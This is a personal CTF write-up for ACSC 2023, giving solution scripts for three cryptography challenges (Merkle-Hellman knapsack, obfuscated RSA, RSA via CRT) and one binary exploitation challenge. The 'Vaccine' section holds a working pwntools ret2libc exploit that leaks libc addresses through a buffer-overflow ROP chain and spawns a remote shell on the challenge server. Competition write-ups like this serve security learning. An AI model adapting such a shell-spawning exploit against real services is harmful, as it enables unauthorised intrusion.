# ACSC 2023 writeup
Ranking : 69th (pretty noice :D ), 88th (global)
## 1. Merkle Hellman
As the name said, this is a Merkle Hellman knapsack cryptosystem challenge. This is the easiest challenge, as We are given public key, private key and ciphertext, so the next step should be using the key to decrypt it.

source:

```python
pubkey = [7352, 2356, 7579, 19235, 1944, 14029, 1084]
privkey = ([184, 332, 713, 1255, 2688, 5243, 10448], 20910)
ciphertext = [8436, 22465, 30044, 22465, 51635, 10380, 11879, 50551, 35250, 51223, 14931, 25048, 7352, 50551, 37606, 39550]

def testkey(r):
    enc = ciphertext[ : ]
    q = privkey[1]
    arr = pubkey[ : ]
    for i in range(len(arr)):
        arr[i] = (arr[i] * pow(r, -1, q))%q
    
    if arr == privkey[0]:
        print("found r")
        print(r)

    flag = []
    for j in enc:
        s = j
        num = 0
        for i in range(6, -1, -1):
            if s >= arr[i]:
                s -= arr[i]
                num = num | (1 << (6 - i))
        flag.append(num)
    return bytes(flag)


from math import gcd

Q = privkey[1]
R = 0
for r in range(100, Q):
    arr = pubkey[ : ]
    if gcd(r, Q) == 1:
        for i in range(len(arr)):
            arr[i] = (arr[i] * pow(r, -1, Q)) %Q
        if arr == privkey[0]:
            print("found r")
        
            R = r 
            break

print("R =",R)
flag = []
enc = ciphertext[ : ]
arr = privkey[0]
for j in enc:
    c = (j * pow(R, -1, Q)) % Q 
    num = 0
    for i in range(6, -1, -1):
        if c >= arr[i]:
            num |= (1 << (6 - i))
            c -= arr[i]
            
    flag.append(num)
print(bytes(flag))
```
## 2. Serverless
The code is writen in javascript, and for some reasons, because of the mismatch data type when passing to btoa, atob function, it took me like 3 hours to figure out what when wrong. The main problem in this challenge is actually RSA with obfuscation, and because it reveals the factor of N, we can easily reverse and decrypt the flag.
Source:
```python
from base64 import b64decode, b64encode
from base64 import urlsafe_b64decode
G = [0x9940435684b6dcfe5beebb6e03dc894e26d6ff83faa9ef1600f60a0a403880ee166f738dd52e3073d9091ddabeaaff27c899a5398f63c39858b57e734c4768b7, 0xbd0d6bef9b5642416ffa04e642a73add5a9744388c5fbb8645233b916f7f7b89ecc92953c62bada039af19caf20ecfded79f62d99d86183f00765161fcd71577, 0xa9fe0fe0b400cd8b58161efeeff5c93d8342f9844c8d53507c9f89533a4b95ae5f587d79085057224ca7863ea8e509e2628e0b56d75622e6eace59d3572305b9, 0x8b7f4e4d82b59122c8b511e0113ce2103b5d40c549213e1ec2edba3984f4ece0346ab1f3f3c0b25d02c1b21d06e590f0186635263407e0b2fa16c0d0234e35a3, 0xf840f1ee2734110a23e9f9e1a05b78eb711c2d782768cef68e729295587c4aa4af6060285d0a2c1c824d2c901e5e8a1b1123927fb537f61290580632ffea0fbb, 0xdd068fd4984969a322c1c8adb4c8cc580adf6f5b180b2aaa6ec8e853a6428a219d7bffec3c3ec18c8444e869aa17ea9e65ed29e51ace4002cdba343367bf16fd, 0x96e2cefe4c1441bec265963da4d10ceb46b7d814d5bc15cc44f17886a09390999b8635c8ffc7a943865ac67f9043f21ca8d5e4b4362c34e150a40af49b8a1699, 0x81834f81b3b32860a6e7e741116a9c446ebe4ba9ba882029b7922754406b8a9e3425cad64bda48ae352cdc71a7d9b4b432f96f51a87305aebdf667bc8988d229, 0xd8200af7c41ff37238f210dc8e3463bc7bcfb774be93c4cff0e127040f63a1bce5375de96b379c752106d3f67ec8dceca3ed7b69239cf7589db9220344718d5f, 0xb704667b9d1212ae77d2eb8e3bd3d5a4cd19aa36fc39768be4fe0656c78444970f5fc14dc39a543d79dfe9063b30275033fc738116e213d4b6737707bb2fd287]
H = [0xd4aa1036d7d302d487e969c95d411142d8c6702e0c4b05e2fbbe274471bf02f8f375069d5d65ab9813f5208d9d7c11c11d55b19da1132c93eaaaba9ed7b3f9b1, 0xc9e55bae9f5f48006c6c01b5963199899e1cdf364759d9ca5124f940437df36e8492b3c98c680b18cac2a847eddcb137699ffd12a2323c9bc74db2c720259a35, 0xcbcdd32652a36142a02051c73c6d64661fbdf4cbae97c77a9ce1a41f74b45271d3200678756e134fe46532f978b8b1d53d104860b3e81bdcb175721ab222c611, 0xf79dd7feae09ae73f55ea8aa40c49a7bc022c754db41f56466698881f265507144089af47d02665d31bba99b89e2f70dbafeba5e42bdac6ef7c2f22efa680a67, 0xab50277036175bdd4e2c7e3b7091f482a0cce703dbffb215ae91c41742db6ed0d87fd706b622f138741c8b56be2e8bccf32b7989ca1383b3d838a49e1c28a087, 0xb5e8c7706f6910dc4b588f8e3f3323503902c1344839f8fcc8d81bfa8e05fec2289af82d1dd19afe8c30e74837ad58658016190e070b845de4449ffb9a48b1a7, 0xc351c7115ceffe554c456dcc9156bc74698c6e05d77051a6f2f04ebc5e54e4641fe949ea7ae5d5d437323b6a4be7d9832a94ad747e48ee1ebac9a70fe7cfec95, 0x815f17d7cddb7618368d1e1cd999a6cb925c635771218d2a93a87a690a56f4e7b82324cac7651d3fbbf35746a1c787fa28ee8aa9f04b0ec326c1530e6dfe7569, 0xe226576ef6e582e46969e29b5d9a9d11434c4fcfeccd181e7c5c1fd2dd9f3ff19641b9c5654c0f2d944a53d3dcfef032230c4adb788b8188314bf2ccf5126f49, 0x84819ec46812a347894ff6ade71ae351e92e0bd0edfe1c87bda39e7d3f13fe54c51f94d0928a01335dd5b8689cb52b638f55ced38693f0964e78b212178ab397]
enc = 'MTE3LDk2LDk4LDEwNyw3LDQzLDIyMCwyMzMsMTI2LDEzMSwyMDEsMTUsMjQ0LDEwNSwyNTIsMTI1LDEwLDE2NiwyMTksMjMwLDI1MCw4MiwyMTEsMTAxLDE5NSwzOSwyNDAsMTU4LDE3NCw1OSwxMDMsMTUzLDEyMiwzNiw2NywxNzksMjI0LDEwOCw5LDg4LDE5MSw5MSwxNCwyMjQsMTkzLDUyLDE4MywyMTUsMTEsMjYsMzAsMTgzLDEzMywxNjEsMTY5LDkxLDQ4LDIyOSw5OSwxOTksMTY1LDEwMCwyMTgsMCwxNjUsNDEsNTUsMTE4LDIyNywyMzYsODAsMTE2LDEyMCwxMjUsMTAsMTIzLDEyNSwxMzEsMTA2LDEyOCwxNTQsMTMzLDU1LDUsNjMsMjM2LDY5LDI3LDIwMSwxMTgsMTgwLDc0LDIxMywxMzEsNDcsMjAwLDExNiw1Miw0OSwxMjAsODYsMTI0LDE3OCw5MiwyNDYsMTE5LDk4LDk1LDg2LDEwNCw2NCwzMCw1NCwyMCwxMDksMTMzLDE1NSwxMjIsMTEsODcsMTYsMjIzLDE2MiwxNjAsMjE1LDIwOSwxMzYsMjQ5LDIyMSwxMzYsMjMy'

passcode = list(b"acscpass")

from itertools import cycle

def xor(a,b):
    return [i^j for i,j in zip(a,b)]

#xor passcode
a = [int(i) for i in b64decode(enc).decode().split(",")]
print(a)
a = a[::-1]

a = xor(a, cycle(passcode))

#take argument
s, k, j = a[-3], a[-2], a[-1]
a = a[:-3]
print(s, k, j)

#restore number form
num  = 0
a = a[::-1]
for i in a:
    num <<= 8
    num |= i

from Crypto.Util.number import isPrime
#get modulo
modulo = H[k] * G[j]
assert(isPrime(H[k]))
assert(isPrime(G[j]))

#get exponent
t = pow(2, pow(2, s)) + 1
d = pow(t, -1, (H[k] - 1)*(G[j] - 1))

#recover number form of plaintext
dec = pow(num, d, modulo)

plaintext = ""
while dec >0:
    plaintext += chr(dec& 0xff)
    dec >>= 8
print(plaintext[::-1])
```
## 3. Vaccine
Idea of this challenge is to leak the libc version and using it to find system libc and "/bin/sh" string 's address.

Source:
```python
from pwn import *
s = remote('vaccine.chal.ctf.acsc.asia', 1337)
#s = process(executable = "./vaccine", argv = [])

chall = ELF("./vaccine")


pop_rdi = 0x0000000000401443
puts_got = chall.got["puts"]
puts_plt = chall.plt["puts"]
ret = 0x000000000040101a
main = 0x0000000000401236

payload = b"A" + b"\x00" * 111 + b"A" + b"\x00" * (0x100 - 113) + b"aaaaaaaa" + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
s.sendline(payload)
s.recvuntil(b"your flag is in another castle\n")

addr = int.from_bytes(s.recv(6), "little")
print("puts address:", hex(addr))
system_offset = 0x0000000000052290
binsh_offset = 0x1b45bd
puts_offset = 0x0000000000084420
system = addr - puts_offset + system_offset 
binsh = addr - puts_offset + binsh_offset

payload = b"A" + b"\x00" * 111 + b"A" + b"\x00" * (0x100 - 113) + b"aaaaaaaa" + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)

s.sendlineafter(b"Give me vaccine: ", payload)


s.interactive()
```
## 4. Check_number_63
In this RSA challenge, We are only given e and check_num(k), which in the first seem might not be possible to factor N. Let's write down the whole equation:
```
e.d - 1 = k.phi_n => e.d + k.phi_n = 1
```
If we mod both side with e:
```
k.phin = 1 (mod e)
```
In this case, do you see the way to solve this? That's right :  Chinese remainder theorem. But still we cannot use that because the number of bit we can use crt to find is 1007, and phi_n is about 1024 bit length. So we have to use a little trick: change phi_n to N - (p + q) + 1, and by bruteforcing the last 17 bit, we can find the sum of 2 factors (p + q), and using it to factor N.
Source:
```python
# f = open("d:\\output.txt")
# checkkey = []
# for i in f.readlines()[1:]:
#     q = i.replace("\n", "").split(":")
#     checkkey.append((int(q[0]), int(q[1])))

# print(checkkey)


checkkey = [(65537, 36212), (65539, 5418), (65543, 27200), (65551, 37275), (65557, 19020), (65563, 18986), (65579, 30121), (65581, 55506), (65587, 34241), (65599, 35120), (65609, 49479), (65617, 38310), (65629, 65504), (65633, 15629), (65647, 27879), (65651, 6535), (65657, 24690), (65677, 57656), (65687, 58616), (65699, 19857), (65701, 9326), (65707, 8739), (65713, 60630), (65717, 35109), (65719, 47240), (65729, 12246), (65731, 35776), (65761, 23462), (65777, 48929), (65789, 13100), (65809, 10941), (65827, 55227), (65831, 21264), (65837, 36029), (65839, 1057), (65843, 11772), (65851, 30488), (65867, 45637), (65881, 40155), (65899, 42192), (65921, 64114), (65927, 8091), (65929, 5184), (65951, 8153), (65957, 33274), (65963, 17143), (65981, 7585), (65983, 62304), (65993, 58644), (66029, 15067), (66037, 47377), (66041, 35110), (66047, 30712), (66067, 4519), (66071, 53528), (66083, 1925), (66089, 29064), (66103, 32308), (66107, 52310), (66109, 13040), (66137, 27981), (66161, 36954), (66169, 9902)]
residue = []
modulo = []
n= 24575303335152579483219397187273958691356380033536698304119157688003502052393867359624475789987237581184979869428436419625817866822376950791646781307952833871208386360334267547053595730896752931770589720203939060500637555186552912818531990295111060561661560818752278790449531513480358200255943011170338510477311001482737373145408969276262009856332084706260368649633253942184185551079729283490321670915209284267457445004967752486031694845276754057130676437920418693027165980362069983978396995830448343187134852971000315053125678630516116662920249232640518175555970306086459229479906220214332209106520050557209988693711

for e, k in checkkey : 
    mod = e 
    r = ((k*n + 1 + k)*pow(k, -1, e)) % e
    residue.append(r)
    modulo.append(e)
#recalculate crt by hand
from sympy.ntheory.modular import crt 

def crt_by_hand(residue, modulo):
    N = 1
    for  i in modulo:
        N*= i
    #print("N's bit length:", N.bit_length())
    ans = 0
    for i in range(len(residue)):
        y = N // modulo[i]
        z = pow(y, -1, modulo[i])
        ans += (residue[i] * y * z)
        ans %= N
    return ans
def solving_p_q(p_q, n):
    a = p_q
    delta = a*a - 4*n
    try:
        idelta, F = iroot(delta, 2)
        assert(F == True)
        ans1 = (a - idelta)//2
        ans2 = (a + idelta)//2
        return ans1,ans2
    except:
        return -1, -1
from gmpy2 import iroot
# from sympy.ntheory.modular import crt
#missing 1 equation, so have to bruteforce

P = -1
Q = -1

for k in range(2, 133087):
    res = residue + [k]
    mod = modulo + [133087]

    p_q = crt(mod, res)[0]
    p, q = solving_p_q(p_q, n)
    if p == -1:
        pass
    else:
        if p * q==n:
            P = p 
            Q = q
            break

from hashlib import sha512


print(P)
print(Q)
if P > Q:
    P, Q = Q, P
print("ACSC{" + sha512(f"{P}{Q}".encode()).hexdigest() + "}")
```
### Note : i will not upload the challenge files, as to minize numbers of file i have to upload on git( yes, i am a lazy person). You can file these challenge on ctftime, or by searching it on google.

